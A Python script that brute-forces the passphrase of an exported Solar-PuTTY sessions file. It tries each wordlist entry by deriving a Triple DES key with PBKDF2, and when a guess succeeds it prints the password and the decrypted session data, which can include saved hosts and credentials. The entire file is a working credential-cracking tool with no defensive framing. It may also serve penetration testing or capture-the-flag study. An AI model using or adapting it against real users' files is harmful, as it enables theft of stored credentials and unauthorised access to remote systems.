#!/usr/bin/python3

import sys
import json
import base64
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import unpad

def decrypt(passphrase, ciphertext):
    array = base64.b64decode(ciphertext)

    # Extract salt, IV, and the actual encrypted data
    salt = array[:24]  # First 24 bytes are salt
    rgbIV = array[24:32]  # Next 8 bytes are the IV (must be 8 bytes for Triple DES)
    array2 = array[48:]  # Everything after 48 bytes is the ciphertext

    key = PBKDF2(passphrase.encode('utf-8'), salt, dkLen=24, count=1000)
    cipher = DES3.new(key, DES3.MODE_CBC, rgbIV)
    decrypted_data = cipher.decrypt(array2)
    try:
        decrypted = unpad(decrypted_data, DES3.block_size)
    except ValueError:
        return None

    return decrypted.decode('utf-8')

def attempt_decrypt(passphrase, content):
    try:
        decrypted_text = decrypt(passphrase, content)
        if decrypted_text and "Sessions" in decrypted_text:
            print(f"Password that worked: {passphrase}")  # Log successful attempt
            return passphrase, decrypted_text
    except Exception as e:
        pass
    return None

def main():
    if len(sys.argv) != 3:
        print("Usage: python3 Bruteforce_SolarPutty.py <wordlist_file_path> <sessions_file_path>")
        return

    wordlist_file = sys.argv[1]
    sessions_file_path = sys.argv[2]

    try:
        with open(sessions_file_path, 'r') as f:
            content = f.read()
            
        with open(wordlist_file, 'r') as f:
            wordlist = [line.strip() for line in f]

        for passphrase in wordlist:
            result = attempt_decrypt(passphrase, content)
            if result:
                passphrase, decrypted_text = result
                print("Decrypted content:")
                json_object = json.loads(decrypted_text)
                print(json.dumps(json_object, indent=4))  # Pretty print JSON
                sys.exit(0)  # Exit after the first successful decryption

        print("Password not found in the wordlist.")

    except FileNotFoundError as e:
        print("File not found:", e)
    except PermissionError as e:
        print("Access denied:", e)
    except Exception as e:
        print("Error:", e)

    sys.exit(1)  # Ensure exit for other cases

if __name__ == "__main__":
    main()
